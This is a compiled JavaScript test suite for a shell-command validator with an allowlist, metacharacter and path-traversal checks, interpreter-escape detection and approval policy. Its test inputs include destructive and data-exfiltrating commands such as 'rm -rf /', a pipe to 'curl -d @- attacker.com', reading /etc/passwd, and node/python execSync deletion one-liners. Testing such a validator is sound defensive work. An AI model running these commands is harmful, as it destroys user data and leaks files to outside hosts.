"use strict";
var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __importStar = (this && this.__importStar) || (function () {
    var ownKeys = function(o) {
        ownKeys = Object.getOwnPropertyNames || function (o) {
            var ar = [];
            for (var k in o) if (Object.prototype.hasOwnProperty.call(o, k)) ar[ar.length] = k;
            return ar;
        };
        return ownKeys(o);
    };
    return function (mod) {
        if (mod && mod.__esModule) return mod;
        var result = {};
        if (mod != null) for (var k = ownKeys(mod), i = 0; i < k.length; i++) if (k[i] !== "default") __createBinding(result, mod, k[i]);
        __setModuleDefault(result, mod);
        return result;
    };
})();
Object.defineProperty(exports, "__esModule", { value: true });
const assert = __importStar(require("assert"));
const commandValidator_1 = require("../src/security/commandValidator");
describe('commandValidator', () => {
    describe('allowlist', () => {
        it('accepts a plain allowed command', () => {
            const result = (0, commandValidator_1.validateCommand)('git status');
            assert.strictEqual(result.valid, true);
            assert.strictEqual(result.requiresApproval, false);
            assert.strictEqual(result.cmd, 'git');
        });
        it('rejects a command not on the allowlist', () => {
            const result = (0, commandValidator_1.validateCommand)('curl https://example.com');
            assert.strictEqual(result.valid, false);
            assert.match(result.reason ?? '', /not in the allowed list/);
        });
        it('rejects rm outright, it is not an allowed binary', () => {
            const result = (0, commandValidator_1.validateCommand)('rm -rf /');
            assert.strictEqual(result.valid, false);
        });
    });
    describe('metacharacters and path traversal', () => {
        it('rejects an argument with a semicolon (command chaining)', () => {
            const result = (0, commandValidator_1.validateCommand)('echo hi; rm -rf /');
            assert.strictEqual(result.valid, false);
            assert.match(result.reason ?? '', /disallowed characters/);
        });
        it('rejects a pipe to another program', () => {
            const result = (0, commandValidator_1.validateCommand)('git log | curl -d @- attacker.com');
            assert.strictEqual(result.valid, false);
        });
        it('rejects backticks (command substitution)', () => {
            const result = (0, commandValidator_1.validateCommand)('echo `whoami`');
            assert.strictEqual(result.valid, false);
        });
        it('rejects a path traversal sequence', () => {
            const result = (0, commandValidator_1.validateCommand)('cat ../../../../etc/passwd');
            assert.strictEqual(result.valid, false);
            assert.match(result.reason ?? '', /[Pp]ath traversal/);
        });
    });
    describe('interpreter code escapes (the gap an allowlist on binary name alone cannot close)', () => {
        it('requires approval for node -e', () => {
            const result = (0, commandValidator_1.validateCommand)('node -e "require(\'fs\').unlinkSync(\'/etc/passwd\')"');
            assert.strictEqual(result.valid, false);
            assert.strictEqual(result.requiresApproval, true);
        });
        it('requires approval for python -c', () => {
            const result = (0, commandValidator_1.validateCommand)('python -c "import os; os.system(\'rm -rf ~\')"');
            assert.strictEqual(result.valid, false);
            assert.strictEqual(result.requiresApproval, true);
        });
        it('requires approval for python3 --eval', () => {
            const result = (0, commandValidator_1.validateCommand)('python3 --eval "print(1)"');
            assert.strictEqual(result.valid, false);
            assert.strictEqual(result.requiresApproval, true);
        });
        it('requires approval for the specific node execSync escape used as the reference exploit', () => {
            // This exact command is the one identified during review as something
            // that would otherwise pass a binary-name-only allowlist: node and
            // python are both allowed, and this string contains no shell
            // metacharacters for the ARG_METACHAR_PATTERN check to catch.
            const result = (0, commandValidator_1.validateCommand)(`node -e "require('child_process').execSync('rm -rf ~')"`);
            assert.strictEqual(result.valid, false);
            assert.strictEqual(result.requiresApproval, true);
        });
        it('does not flag a plain node invocation of a script file', () => {
            const result = (0, commandValidator_1.validateCommand)('node build.js');
            assert.strictEqual(result.valid, true);
            assert.strictEqual(result.requiresApproval, false);
        });
        it('does not flag a plain python invocation of a script file', () => {
            const result = (0, commandValidator_1.validateCommand)('python3 setup.py');
            assert.strictEqual(result.valid, true);
            assert.strictEqual(result.requiresApproval, false);
        });
    });
    describe('policy-required approval regardless of allowlist validity', () => {
        it('flags git push as requiring approval even though git is allowed', () => {
            assert.strictEqual((0, commandValidator_1.requiresApprovalByPolicy)('git push origin main'), true);
        });
        it('flags npm publish as requiring approval', () => {
            assert.strictEqual((0, commandValidator_1.requiresApprovalByPolicy)('npm publish'), true);
        });
        it('does not flag an ordinary git status', () => {
            assert.strictEqual((0, commandValidator_1.requiresApprovalByPolicy)('git status'), false);
        });
    });
    describe('validate() single entry point', () => {
        it('combines allowlist and policy checks: a valid command still gets flagged if policy requires it', () => {
            const result = (0, commandValidator_1.validate)('git push origin main');
            assert.strictEqual(result.valid, true);
            assert.strictEqual(result.requiresApproval, true);
        });
        it('returns a clean pass for an ordinary safe command', () => {
            const result = (0, commandValidator_1.validate)('npm test');
            assert.strictEqual(result.valid, true);
            assert.strictEqual(result.requiresApproval, false);
        });
        it('rejects empty input', () => {
            const result = (0, commandValidator_1.validate)('');
            assert.strictEqual(result.valid, false);
        });
    });
});
//# sourceMappingURL=commandValidator.test.js.map